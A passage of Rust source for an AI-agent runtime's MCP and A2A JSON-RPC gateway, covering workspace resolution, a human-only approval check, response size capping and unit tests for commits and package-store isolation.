                    json!({ "uri": "aegis://workspace/status", "name": "CoW Workspace Status & Diffs" }),
                    json!({ "uri": "aegis://ipc/inbox", "name": "Agent IPC Mailbox" }),
                    json!({ "uri": "aegis://org/peers", "name": "Organization Active Peers" }),
                    json!({ "uri": "aegis://global/peers", "name": "Global Workstation Peers Across All Repositories" }),
                    json!({ "uri": "aegis://a2a/agent-cards", "name": "Google A2A Agent Cards Across Workstation" }),
                    json!({ "uri": "aegis://a2a/tasks", "name": "Google A2A Stateful Tasks" }),
                    json!({ "uri": "aegis://org/shared/catalog", "name": "Organization CAS Artifact Catalog" }),
                    json!({ "uri": "aegis://mcp/installed", "name": "Installed External MCP Servers & Auth Status" }),
                ];
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "resources": resources
                    }
                })
            }
            "resources/read" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let uri = params.get("uri").and_then(|v| v.as_str()).unwrap_or("");
                let resource_denied = match uri {
                    "aegis://ipc/inbox"
                    | "agentos://ipc/inbox"
                    | "aegis://org/peers"
                    | "agentos://org/peers"
                    | "aegis://global/peers"
                    | "aegis://a2a/agent-cards"
                    | "aegis://a2a/tasks"
                    | "aegis://org/shared/catalog"
                    | "agentos://org/shared/catalog" => profile == GatewayToolProfile::Minimal,
                    _ => false,
                };
                if resource_denied {
                    return Ok(json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": {
                            "code": -32601,
                            "message": format!(
                                "Resource '{}' is not enabled under active tool profile '{}'",
                                uri,
                                profile.as_str()
                            )
                        }
                    }));
                }
                let payload = match uri {
                    "aegis://workspace/status" | "agentos://workspace/status" => {
                        self.call_tool(identity, "workspace_status", json!({})).await?
                    }
                    "aegis://ipc/inbox" | "agentos://ipc/inbox" => {
                        self.call_tool(identity, "ipc_recv", json!({ "unread_only": true }))
                            .await?
                    }
                    "aegis://org/peers" | "agentos://org/peers" | "aegis://global/peers"
                    | "aegis://a2a/agent-cards" => {
                        self.call_tool(identity, "ipc_list_peers", json!({})).await?
                    }
                    "aegis://a2a/tasks" => {
                        self.call_tool(identity, "ipc_task_list", json!({})).await?
                    }
                    "aegis://org/shared/catalog" | "agentos://org/shared/catalog" => {
                        let arts = self.org_storage.list_artifacts(&identity.org_id).await?;
                        json!({ "artifacts": arts })
                    }
                    "aegis://mcp/installed" | "agentos://mcp/installed" => {
                        self.build_installed_mcp_inventory(
                            &identity.org_id,
                            Some(&identity.agent_id),
                        )
                        .await
                    }
                    _ => json!({ "error": "Unknown resource URI" }),
                };
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "contents": [{
                            "uri": uri,
                            "mimeType": "application/json",
                            "text": serde_json::to_string_pretty(&payload)?
                        }]
                    }
                })
            }
            // Google A2A Protocol JSON-RPC 2.0 Methods (`agent/card`, `tasks/send`, `tasks/get`, `tasks/cancel`, `tasks/list`)
            "agent/card" | "agent/authenticatedExtendedCard" => {
                let peers = self.ipc.list_all_peers().await.unwrap_or_default();
                let cards: Vec<_> = peers
                    .into_iter()
                    .filter(|p| p.online)
                    .map(|p| p.to_agent_card("http://127.0.0.1:7080"))
                    .collect();
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "protocol": "google-a2a/0.2",
                        "self_address": format!("{}/{}", identity.org_id, identity.agent_id),
                        "agents": cards
                    }
                })
            }
            "tasks/send" | "message/send" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let to_agent = params
                    .get("to_agent")
                    .or_else(|| params.get("agent"))
                    .and_then(|v| v.as_str())
                    .unwrap_or(&identity.agent_id);
                let subject = params
                    .get("subject")
                    .or_else(|| {
                        params
                            .get("message")
                            .and_then(|m| m.get("parts"))
                            .and_then(|p| p.as_array())
                            .and_then(|arr| arr.first())
                            .and_then(|part| part.get("text"))
                    })
                    .and_then(|v| v.as_str())
                    .unwrap_or("A2A Task");
                let payload = params
                    .get("payload")
                    .or_else(|| params.get("message"))
                    .cloned()
                    .unwrap_or_else(|| json!({}));
                let attachments: Vec<String> = params
                    .get("attachments")
                    .and_then(|v| serde_json::from_value(v.clone()).ok())
                    .unwrap_or_default();
                match self
                    .call_tool(
                        identity,
                        "ipc_request",
                        json!({
                            "to_agent": to_agent,
                            "subject": subject,
                            "payload": payload,
                            "attachments": attachments
                        }),
                    )
                    .await
                {
                    Ok(sent) => {
                        let task_id = sent.get("msg_id").and_then(|v| v.as_str()).unwrap_or("");
                        let task = self.ipc.get_task(task_id).await.ok().flatten();
                        json!({
                            "jsonrpc": "2.0",
                            "id": id,
                            "result": task.map(|t| serde_json::to_value(t).unwrap_or(sent.clone())).unwrap_or(sent)
                        })
                    }
                    Err(e) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": { "code": -32001, "message": e.to_string() }
                    }),
                }
            }
            "tasks/get" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let task_id = params
                    .get("id")
                    .or_else(|| params.get("task_id"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                match self.ipc.get_task(task_id).await {
                    Ok(Some(task)) if task.visible_to_org(&identity.org_id) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "result": task
                    }),
                    _ => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": { "code": -32004, "message": format!("A2A task '{}' not found", task_id) }
                    }),
                }
            }
            "tasks/cancel" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let task_id = params
                    .get("id")
                    .or_else(|| params.get("task_id"))
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                let reason = params
                    .get("reason")
                    .and_then(|v| v.as_str())
                    .map(|s| s.to_string())
                    .or_else(|| Some("Canceled via A2A tasks/cancel".to_string()));
                let expected_revision = params
                    .get("expected_revision")
                    .and_then(|v| v.as_u64());
                // The IPC bus enforces org ownership plus requester-only cancellation, so a
                // cross-org or non-requester caller gets the same `not found` / refusal answer.
                match self
                    .ipc
                    .update_task_state_cas(
                        identity,
                        task_id,
                        expected_revision,
                        A2ATaskState::Canceled,
                        reason,
                        vec![],
                    )
                    .await
                {
                    Ok(task) => {
                        self.cleanup_terminal_task(identity, &task.id).await;
                        json!({
                            "jsonrpc": "2.0",
                            "id": id,
                            "result": task
                        })
                    }
                    Err(e) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": { "code": -32004, "message": e.to_string() }
                    }),
                }
            }
            "tasks/list" => {
                let tasks = self
                    .ipc
                    .list_tasks(Some(&identity.org_id), None)
                    .await
                    .unwrap_or_default();
                json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": { "tasks": tasks }
                })
            }
            "tools/call" => {
                let params = req.get("params").cloned().unwrap_or_else(|| json!({}));
                let name = params.get("name").and_then(|v| v.as_str()).unwrap_or("");
                let arguments = params
                    .get("arguments")
                    .cloned()
                    .unwrap_or_else(|| json!({}));

                if matches!(profile, GatewayToolProfile::Minimal | GatewayToolProfile::Collab)
                    && !profile.allows_tool(name)
                {
                    return Ok(json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "error": {
                            "code": -32601,
                            "message": format!(
                                "Tool '{}' is not enabled under active tool profile '{}'",
                                name,
                                profile.as_str()
                            )
                        }
                    }));
                }

                let include_source_files = arguments
                    .get("include_source_files")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let result = if HUMAN_ONLY_TOOLS.contains(&name) {
                    Err(anyhow::anyhow!(
                        "`{}` is reserved for the human operator; agents cannot grant leases or approve escalations. Ask the user to approve the pending escalation in the Web Approval Console (/approve or /dashboard) or provide their 6-digit TOTP code in chat.",
                        name
                    ))
                } else {
                    self.call_tool(identity, name, arguments).await
                };
                match result {
                    Ok(mut val) => {
                        // Push channel for every MCP client (incl. ones without lifecycle hooks):
                        // piggyback a compact unread-mail summary on each tool result.
                        if !matches!(name, "ipc_recv" | "ipc_ack") {
                            if let (Some(inbox), Some(obj)) =
                                (self.inbox_summary(identity).await, val.as_object_mut())
                            {
                                obj.insert("_aegis_inbox".to_string(), inbox);
                            }
                        }
                        let skip_cap = name == "workspace_commit" && include_source_files;
                        let text = format_capped_mcp_tool_text(
                            val,
                            MAX_MCP_TOOL_RESPONSE_BYTES,
                            skip_cap,
                        )?;
                        json!({
                            "jsonrpc": "2.0",
                            "id": id,
                            "result": {
                                "content": [{
                                    "type": "text",
                                    "text": text
                                }]
                            }
                        })
                    }
                    Err(err) => json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "result": {
                            "isError": true,
                            "content": [{
                                "type": "text",
                                "text": format!("Aegis OS Syscall Error: {}", err)
                            }]
                        }
                    }),
                }
            }
            _ => json!({
                "jsonrpc": "2.0",
                "id": id,
                "result": {}
            }),
        };

        Ok(response)
    }

    pub fn extract_workspace_from_init_params(params: &Value) -> Option<PathBuf> {
        let raw_uri = params
            .get("rootUri")
            .and_then(|v| v.as_str())
            .or_else(|| params.get("rootPath").and_then(|v| v.as_str()))
            .or_else(|| {
                params
                    .get("workspaceFolders")
                    .and_then(|v| v.as_array())
                    .and_then(|arr| arr.first())
                    .and_then(|f| f.get("uri").or_else(|| f.get("path")))
                    .and_then(|v| v.as_str())
            })
            .or_else(|| {
                params
                    .get("roots")
                    .and_then(|v| v.as_array())
                    .and_then(|arr| arr.first())
                    .and_then(|f| f.get("uri").or_else(|| f.get("path")))
                    .and_then(|v| v.as_str())
            })?;
        let cleaned = raw_uri.strip_prefix("file://").unwrap_or(raw_uri);
        let p = PathBuf::from(cleaned);
        if p.exists() {
            Some(std::fs::canonicalize(&p).unwrap_or(p))
        } else {
            None
        }
    }

    fn is_repo_root(dir: &Path) -> bool {
        dir.join(".git").exists()
            || dir.join("Cargo.toml").exists()
            || dir.join("package.json").exists()
            || dir.join("pyproject.toml").exists()
            || dir.join("go.mod").exists()
            || dir.join(".aegis").exists()
            || dir.join("Makefile").exists()
            || dir.join("CMakeLists.txt").exists()
            || dir.join("flake.nix").exists()
            || dir.join("pom.xml").exists()
            || dir.join("build.gradle").exists()
            || dir.join("build.gradle.kts").exists()
    }

    /// Returns `true` only when `dir` is a pure multi-project container directory:
    /// 1. `dir` itself is not a project root;
    /// 2. `dir` contains no non-hidden regular files directly at its root;
    /// 3. `dir` contains at least one direct non-hidden child directory that is a project root.
    ///
    /// This prevents non-Git project/paper directories (e.g. `SYLVA/paper/main.tex` with or without
    /// a root `README.md`) from being misclassified as umbrella containers and hijacked to a sibling repo.
    pub fn is_umbrella_parent_dir(dir: &Path) -> bool {
        if !dir.is_dir() || Self::is_repo_root(dir) {
            return false;
        }
        let Ok(entries) = std::fs::read_dir(dir) else {
            return false;
        };
        let mut has_child_repo = false;
        for entry in entries.flatten() {
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with('.') {
                continue;
            }
            let Ok(ft) = entry.file_type() else {
                continue;
            };
            if ft.is_file() {
                return false;
            }
            if ft.is_dir() && Self::is_repo_root(&entry.path()) {
                has_child_repo = true;
            }
        }
        has_child_repo
    }

    /// If `dir` is an umbrella parent directory (containing one or more child repositories rather than
    /// being a repository root itself), returns the most recently modified child repository root.
    pub fn resolve_umbrella_child_repo(dir: &Path) -> Option<PathBuf> {
        if !Self::is_umbrella_parent_dir(dir) {
            return None;
        }
        let entries = std::fs::read_dir(dir).ok()?;
        let mut best: Option<(std::time::SystemTime, PathBuf)> = None;
        for entry in entries.flatten() {
            let p = entry.path();
            if !p.is_dir() {
                continue;
            }
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if name_str.starts_with('.') {
                continue;
            }
            if Self::is_repo_root(&p) {
                let mtime = entry
                    .metadata()
                    .and_then(|m| m.modified())
                    .unwrap_or(std::time::SystemTime::UNIX_EPOCH);
                if best.as_ref().is_none_or(|(best_t, _)| mtime >= *best_t) {
                    best = Some((mtime, p));
                }
            }
        }
        best.map(|(_, p)| std::fs::canonicalize(&p).unwrap_or(p))
    }

    /// Resolve the active workspace for a client session without letting concurrent windows
    /// overwrite each other through a global `active_workspace.txt`, and without overriding
    /// explicit non-umbrella directories (like a LaTeX paper folder without `.git`).
    pub fn resolve_workspace_for_session(
        &self,
        base_ws: &Path,
        session_key: Option<&aos_core::session::SessionKey>,
    ) -> PathBuf {
        let session_binding = session_key.and_then(|k| {
            aos_core::session::resolve_workspace_binding_for_key(&self.runtime_data_root, k)
        });
        if let Some((bound_ws, _umbrella, true)) = &session_binding {
            return bound_ws.clone();
        }

        let s = base_ws.to_string_lossy();
        let is_hook_cfg = s.ends_with("/.gemini/config")
            || s.ends_with("/.agents")
            || s.ends_with("/.agent");
        let is_unspecified_ws =
            is_hook_cfg || base_ws == Path::new(".") || base_ws.as_os_str().is_empty();
        if is_unspecified_ws {
            if let Ok(env_ws) = std::env::var("AOS_WORKSPACE") {
                let p = PathBuf::from(env_ws.trim());
                if p.exists() {
                    let canon = std::fs::canonicalize(&p).unwrap_or(p);
                    return if Self::is_umbrella_parent_dir(&canon) {
                        Self::resolve_umbrella_child_repo(&canon).unwrap_or(canon)
                    } else {
                        canon
                    };
                }
            }
        }
        if is_hook_cfg {
            if let Some((bound_ws, _, _)) = session_binding {
                return bound_ws;
            }
            if s.ends_with("/.agents") || s.ends_with("/.agent") {
                if let Some(parent) = base_ws.parent() {
                    let canon_parent =
                        std::fs::canonicalize(parent).unwrap_or_else(|_| parent.to_path_buf());
                    return if Self::is_umbrella_parent_dir(&canon_parent) {
                        Self::resolve_umbrella_child_repo(&canon_parent).unwrap_or(canon_parent)
                    } else {
                        canon_parent
                    };
                }
            }
            if session_key.is_none() {
                let saved_file = self.runtime_data_root.join("active_workspace.txt");
                if let Ok(saved) = std::fs::read_to_string(&saved_file) {
                    let p = PathBuf::from(saved.trim());
                    if p.exists() {
                        let canon = std::fs::canonicalize(&p).unwrap_or(p);
                        return if Self::is_umbrella_parent_dir(&canon) {
                            Self::resolve_umbrella_child_repo(&canon).unwrap_or(canon)
                        } else {
                            canon
                        };
                    }
                }
            }
            return std::fs::canonicalize(base_ws).unwrap_or_else(|_| base_ws.to_path_buf());
        }

        if Self::is_umbrella_parent_dir(base_ws) {
            let canon_umb =
                std::fs::canonicalize(base_ws).unwrap_or_else(|_| base_ws.to_path_buf());
            if let Some((bound_ws, _, _)) = session_binding {
                if bound_ws.starts_with(&canon_umb) && bound_ws != canon_umb {
                    return bound_ws;
                }
            }
            return Self::resolve_umbrella_child_repo(&canon_umb).unwrap_or(canon_umb);
        }

        std::fs::canonicalize(base_ws).unwrap_or_else(|_| base_ws.to_path_buf())
    }

    pub fn resolve_workspace_fallback(&self, current_ws: &Path) -> PathBuf {
        let key = aos_core::session::client_session_key();
        self.resolve_workspace_for_session(current_ws, key.as_ref())
    }

    pub async fn serve_stdio(&self, identity: AgentIdentity) -> anyhow::Result<()> {
        let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        self.serve_stdio_lazy(identity, cwd, false, None).await
    }

    /// Serves MCP over `stdio` with instant (<0.5 ms) `initialize` and `tools/list` handshakes,
    /// deferring `ensure_agent_environment` (CoW cloning) until the first `tools/call` or `resources/read`
    /// and dynamically resolving the workspace path from `initialize` `rootUri`/`workspaceFolders` or AGY hook state.
    ///
    /// `auto_agent_client`: when the agent id was `auto`, the client name (`agy`, `claude`, ...). The
    /// principal is then re-resolved per call from the per-session binding written by lifecycle hooks
    /// (see `aos_core::session`), so every client window is a distinct peer and resumed conversations
    /// keep their identity.
    pub async fn serve_stdio_lazy(
        &self,
        mut identity: AgentIdentity,
        initial_workspace: PathBuf,
        auto_org: bool,
        auto_agent_client: Option<String>,
    ) -> anyhow::Result<()> {
        let session_key = auto_agent_client
            .as_ref()
            .and_then(|_| aos_core::session::client_session_key());
        let ws_session_key = session_key.or_else(aos_core::session::client_session_key);
        let stdin = tokio::io::stdin();
        let mut stdout = tokio::io::stdout();
        let mut reader = BufReader::new(stdin).lines();
        let mut base_workspace = initial_workspace;
        let mut session_switched_ws: Option<PathBuf> = None;
        let mut active_workspace =
            self.resolve_workspace_for_session(&base_workspace, ws_session_key.as_ref());
        if auto_org {
            identity.org_id =
                aos_core::session::resolve_auto_org_id(&self.runtime_data_root, &active_workspace);
        }

        let mut notif_rx = self.subscribe_mcp_notifications();
        loop {
            let next_line_opt = tokio::select! {
                res = reader.next_line() => res?,
                recv = notif_rx.recv() => {
                    match recv {
                        Ok(note) => {
                            if note.matches_identity(&identity.org_id, &identity.agent_id) {
                                let out_line = format!("{}\n", serde_json::to_string(&note.payload)?);
                                stdout.write_all(out_line.as_bytes()).await?;
                                stdout.flush().await?;
                            }
                        }
                        Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => {}
                        Err(tokio::sync::broadcast::error::RecvError::Closed) => {}
                    }
                    continue;
                }
            };
            let Some(line) = next_line_opt else {
                break;
            };
            if line.trim().is_empty() {
                continue;
            }
            let req: Value = match serde_json::from_str(&line) {
                Ok(v) => v,
                Err(_) => continue,
            };
            let method = req.get("method").and_then(|v| v.as_str()).unwrap_or("");

            // JSON-RPC 2.0 notifications (e.g. `notifications/initialized`) have no `id` and MUST NOT receive a response!
            if req.get("id").is_none() || method.starts_with("notifications/") {
                continue;
            }

            if method == "initialize" {
                if let Some(params) = req.get("params") {
                    if let Some(ws_from_init) = Self::extract_workspace_from_init_params(params) {
                        base_workspace = ws_from_init;
                        if let Some(key) = ws_session_key {
                            if aos_core::session::resolve_workspace_binding_for_key(
                                &self.runtime_data_root,
                                &key,
                            )
                            .is_none()
                            {
                                let resolved = self
                                    .resolve_workspace_for_session(&base_workspace, Some(&key));
                                let umb = if Self::is_umbrella_parent_dir(&base_workspace) {
                                    Some(
                                        std::fs::canonicalize(&base_workspace)
                                            .unwrap_or_else(|_| base_workspace.clone()),
                                    )
                                } else {
                                    None
                                };
                                let client_name = auto_agent_client.as_deref().unwrap_or("auto");
                                let _ = aos_core::session::bind_workspace_for_key(
                                    &self.runtime_data_root,
                                    client_name,
                                    &key,
                                    None,
                                    &resolved,
                                    umb.as_deref(),
                                    false,
                                );
                            }
                        } else {
                            let _ = std::fs::write(
                                self.runtime_data_root.join("active_workspace.txt"),
                                base_workspace.to_string_lossy().as_bytes(),
                            );
                        }
                    }
                }
                active_workspace =
                    self.resolve_workspace_for_session(&base_workspace, ws_session_key.as_ref());
                if auto_org && session_switched_ws.is_none() {
                    identity.org_id = aos_core::session::resolve_auto_org_id(
                        &self.runtime_data_root,
                        &active_workspace,
                    );
                }
            } else if method == "tools/call" || method == "resources/read" {
                active_workspace = if let Some(ref sw) = session_switched_ws {
                    sw.clone()
                } else {
                    self.resolve_workspace_for_session(&base_workspace, ws_session_key.as_ref())
                };
                if auto_org && session_switched_ws.is_none() {
                    identity.org_id = aos_core::session::resolve_auto_org_id(
                        &self.runtime_data_root,
                        &active_workspace,
                    );
                }
                if let (Some(client), Some(key)) = (auto_agent_client.as_ref(), session_key.as_ref()) {
                    identity.agent_id = aos_core::session::resolve_agent_id_for_key(
                        &self.runtime_data_root,
                        client,
                        key,
                    );
                }
                if let Err(err) = self
                    .ensure_agent_environment(
                        identity.clone(),
                        &active_workspace,
                        IsolationTier::NativeOsSandbox,
                        vec!["*".to_string()],
                    )
                    .await
                {
                    let id = req.get("id").cloned().unwrap_or(Value::Null);
                    let err_resp = json!({
                        "jsonrpc": "2.0",
                        "id": id,
                        "result": {
                            "isError": true,
                            "content": [{
                                "type": "text",
                                "text": format!("Aegis OS Environment Initialization Error: {}", err)
                            }]
                        }
                    });
                    let out_line = format!("{}\n", serde_json::to_string(&err_resp)?);
                    stdout.write_all(out_line.as_bytes()).await?;
                    stdout.flush().await?;
                    continue;
                }
                let _ = self
                    .ipc
                    .update_peer_metadata(
                        &identity,
                        auto_agent_client.clone(),
                        session_key.map(|k| k.pid),
                        session_key.map(|k| k.start_time),
                        Some(active_workspace.display().to_string()),
                    )
                    .await;
            }

            let is_workspace_switch_call = method == "tools/call"
                && req
                    .get("params")
                    .and_then(|p| p.get("name"))
                    .and_then(|v| v.as_str())
                    == Some("workspace_switch");
            let id = req.get("id").cloned().unwrap_or(Value::Null);
            let response = match self.handle_jsonrpc_message(&identity, req).await {
                Ok(resp) => resp,
                Err(err) => json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": {
                        "isError": true,
                        "content": [{
                            "type": "text",
                            "text": format!("Aegis OS Kernel Error: {}", err)
                        }]
                    }
                }),
            };
            if is_workspace_switch_call {
                if let Some(payload) = response
                    .get("result")
                    .filter(|r| r.get("isError").and_then(|v| v.as_bool()) != Some(true))
                    .and_then(|r| r.get("content"))
                    .and_then(|c| c.as_array())
                    .and_then(|arr| arr.first())
                    .and_then(|item| item.get("text"))
                    .and_then(|t| t.as_str())
                    .and_then(|txt| serde_json::from_str::<Value>(txt).ok())
                {
                    if payload.get("status").and_then(|v| v.as_str()) == Some("workspace_switched") {
                        if let Some(new_root) =
                            payload.get("host_source_root").and_then(|v| v.as_str())
                        {
                            let new_ws = PathBuf::from(new_root);
                            if new_ws.is_dir() {
                                session_switched_ws = Some(new_ws.clone());
                                active_workspace = new_ws;
                            }
                        }
                        if let Some(new_org) = payload.get("org_id").and_then(|v| v.as_str()) {
                            if !new_org.trim().is_empty() {
                                identity.org_id = new_org.to_string();
                            }
                        }
                        let umb_path = payload
                            .get("umbrella_root")
                            .and_then(|v| v.as_str())
                            .map(PathBuf::from);
                        if let Some(key) = ws_session_key.as_ref() {
                            let client_label = auto_agent_client.as_deref().unwrap_or("mcp-client");
                            let _ = aos_core::session::bind_workspace_for_key(
                                &self.runtime_data_root,
                                client_label,
                                key,
                                None,
                                &active_workspace,
                                umb_path.as_deref(),
                                true,
                            );
                        }
                    }
                }
            }
            let out_line = format!("{}\n", serde_json::to_string(&response)?);
            stdout.write_all(out_line.as_bytes()).await?;
            while let Ok(note) = notif_rx.try_recv() {
                if note.matches_identity(&identity.org_id, &identity.agent_id) {
                    let note_line = format!("{}\n", serde_json::to_string(&note.payload)?);
                    stdout.write_all(note_line.as_bytes()).await?;
                }
            }
            stdout.flush().await?;
        }
        Ok(())
    }

}

const MAX_MCP_TOOL_RESPONSE_BYTES: usize = 512 * 1024;

fn format_capped_mcp_tool_text(
    mut val: Value,
    max_bytes: usize,
    skip_cap: bool,
) -> anyhow::Result<String> {
    let pretty = serde_json::to_string_pretty(&val)?;
    if skip_cap || pretty.len() <= max_bytes {
        return Ok(pretty);
    }

    let compact = serde_json::to_string(&val)?;
    let original_bytes = compact.len();
    if original_bytes <= max_bytes {
        return Ok(compact);
    }

    let status_summary = val
        .get("status")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    if let Some(obj) = val.as_object_mut() {
        obj.insert("_truncated".to_string(), json!(true));
        obj.insert("_original_bytes".to_string(), json!(original_bytes));
        if let Some(changes) = obj
            .get_mut("uncommitted_changes")
            .and_then(|v| v.as_array_mut())
        {
            for item in changes.iter_mut() {
                if let Some(m) = item.as_object_mut() {
                    if let Some(diff) = m.get("preview_diff").and_then(|v| v.as_str()) {
                        if diff.len() > 256 {
                            let prefix: String = diff.chars().take(256).collect();
                            m.insert(
                                "preview_diff".to_string(),
                                json!(format!("{prefix}…[truncated]")),
                            );
                        }
                    }
                }
            }
        }
    }

    for cap in [200usize, 50, 10, 0] {
        if let Some(obj) = val.as_object_mut() {
            for key in [
                "uncommitted_changes",
                "committed_files",
                "files",
                "pending_escalations",
                "entries",
                "committed_source_files",
            ] {
                if let Some(arr) = obj.get_mut(key).and_then(|v| v.as_array_mut()) {
                    if arr.len() > cap {
                        arr.truncate(cap);
                    }
                }
            }
        }
        let candidate = serde_json::to_string(&val)?;
        if candidate.len() <= max_bytes {
            return Ok(candidate);
        }
    }

    let fallback = json!({
        "_truncated": true,
        "original_bytes": original_bytes,
        "max_bytes": max_bytes,
        "status": status_summary,
        "message": "Tool response exceeded MCP stdio frame cap; inspect specific paths with fs_read or workspace_diff."
    });
    Ok(serde_json::to_string(&fallback)?)
}

#[cfg(test)]
mod tests {
    use super::*;

    async fn read_full_http_request(sock: &mut tokio::net::TcpStream) -> String {
        let mut buf = Vec::with_capacity(4096);
        let mut chunk = [0u8; 4096];
        let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(2);
        let mut expected_total: Option<usize> = None;
        loop {
            let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
            if remaining.is_zero() {
                break;
            }
            match tokio::time::timeout(
                remaining,
                tokio::io::AsyncReadExt::read(sock, &mut chunk),
            )
            .await
            {
                Ok(Ok(0)) | Ok(Err(_)) | Err(_) => break,
                Ok(Ok(n)) => {
                    buf.extend_from_slice(&chunk[..n]);
                    if expected_total.is_none() {
                        if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                            let header_end = pos + 4;
                            let headers = String::from_utf8_lossy(&buf[..header_end]);
                            let content_len = headers
                                .lines()
                                .find_map(|line| {
                                    let (k, v) = line.split_once(':')?;
                                    if k.trim().eq_ignore_ascii_case("content-length") {
                                        v.trim().parse::<usize>().ok()
                                    } else {
                                        None
                                    }
                                })
                                .unwrap_or(0);
                            expected_total = Some(header_end + content_len);
                        }
                    }
                    if expected_total.is_some_and(|total| buf.len() >= total) {
                        break;
                    }
                }
            }
        }
        String::from_utf8_lossy(&buf).to_string()
    }

    #[test]
    fn test_format_capped_mcp_tool_text_truncates_oversized_payloads() {
        let small = json!({ "status": "ok", "count": 2 });
        let out_small = format_capped_mcp_tool_text(small, 4096, false).unwrap();
        assert!(out_small.contains('\n'), "small payload should remain pretty");

        let huge_changes: Vec<Value> = (0..1000)
            .map(|i| {
                json!({
                    "relative_path": format!("dir/file_{i}.ts"),
                    "preview_diff": "x".repeat(400)
                })
            })
            .collect();
        let huge = json!({
            "status": "ok",
            "uncommitted_changes_count": 1000,
            "uncommitted_changes": huge_changes
        });

        let uncapped = format_capped_mcp_tool_text(huge.clone(), 4096, true).unwrap();
        assert!(uncapped.len() > 4096);

        let capped = format_capped_mcp_tool_text(huge, 4096, false).unwrap();
        assert!(capped.len() <= 4096, "capped length {} > 4096", capped.len());
        let parsed: Value = serde_json::from_str(&capped).unwrap();
        assert_eq!(parsed["_truncated"], true);
    }

    #[tokio::test]
    async fn test_workspace_commit_omits_source_files_by_default_and_includes_when_requested() {
        let temp = tempfile::tempdir().unwrap();
        let host_proj = temp.path().join("proj");
        std::fs::create_dir_all(&host_proj).unwrap();
        std::fs::write(host_proj.join("hello.txt"), "v0\n").unwrap();

        let kernel = AegisRuntimeKernel::new(temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("aegis-os", "agent-commit", "Coder");
        let env = kernel
            .ensure_agent_environment(agent.clone(), &host_proj, IsolationTier::NativeOsSandbox, vec![])
            .await
            .unwrap();

        // 1. Default commit omits committed_source_files
        std::fs::write(env.workspace.shadow_root().join("hello.txt"), "v1\n").unwrap();
        let ask1 = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        let esc1 = ask1["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc1, 600, "user").await.unwrap();
        let res1 = kernel
            .call_tool(&agent, "workspace_commit", json!({}))
            .await
            .unwrap();
        assert_eq!(res1["status"], "committed_to_host");
        assert_eq!(res1["committed_files_count"], 1);
        assert!(
            res1.get("committed_source_files").is_none(),
            "committed_source_files must be omitted by default: {res1}"
        );

        // 2. Explicit include_source_files: true returns synced source files
        std::fs::write(env.workspace.shadow_root().join("hello2.txt"), "v2\n").unwrap();
        let res2 = kernel
            .call_tool(
                &agent,
                "workspace_commit",
                json!({ "include_source_files": true }),
            )
            .await
            .unwrap();
        assert_eq!(res2["status"], "committed_to_host");
        let srcs = res2["committed_source_files"].as_array().unwrap();
        assert!(srcs.iter().any(|s| s["path"] == "hello2.txt" && s["content"] == "v2\n"));
    }

    #[tokio::test]
    async fn test_pkg_install_isolates_pnpm_store_outside_workspace() {
        let temp = tempfile::tempdir().unwrap();
        let host_proj = temp.path().join("pnpm_proj");
        std::fs::create_dir_all(host_proj.join("node_modules/.bin")).unwrap();
        std::fs::write(host_proj.join("package.json"), "{\"name\":\"demo\"}\n").unwrap();
        let fake_pnpm = host_proj.join("node_modules/.bin/pnpm");
        std::fs::write(
            &fake_pnpm,
            "#!/bin/sh\nset -eu\nprintf 'PNPM_STORE_DIR=%s\\nnpm_config_store_dir=%s\\n' \"$PNPM_STORE_DIR\" \"$npm_config_store_dir\" > .pnpm_env.txt\nmkdir -p node_modules/fake-pkg\n",
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut p = std::fs::metadata(&fake_pnpm).unwrap().permissions();
            p.set_mode(0o755);
            std::fs::set_permissions(&fake_pnpm, p).unwrap();
        }

        let kernel = AegisRuntimeKernel::new(temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("aegis-os", "pnpm-agent", "Coder");
        let env = kernel
            .ensure_agent_environment(agent.clone(), &host_proj, IsolationTier::NativeOsSandbox, vec![])
            .await
            .unwrap();
        let args = json!({ "manager": "pnpm", "packages": ["fake-pkg"], "offline": true });
        let ask = kernel.call_tool(&agent, "pkg_install", args.clone()).await.unwrap();
        let esc = ask["escalation_id"].as_str().unwrap().to_string();
        kernel.policy.approve_escalation(&esc, 600, "user").await.unwrap();
        let res = kernel.call_tool(&agent, "pkg_install", args).await.unwrap();
        assert_eq!(res["status"], "pkg_installed", "{res}");

        let env_txt = std::fs::read_to_string(env.workspace.shadow_root().join(".pnpm_env.txt")).unwrap();
        let expected_store = env.sandbox.config().agent_home_dir.join("deps/cache/pnpm-store");
        assert!(env_txt.contains(&format!("PNPM_STORE_DIR={}", expected_store.display())), "{env_txt}");
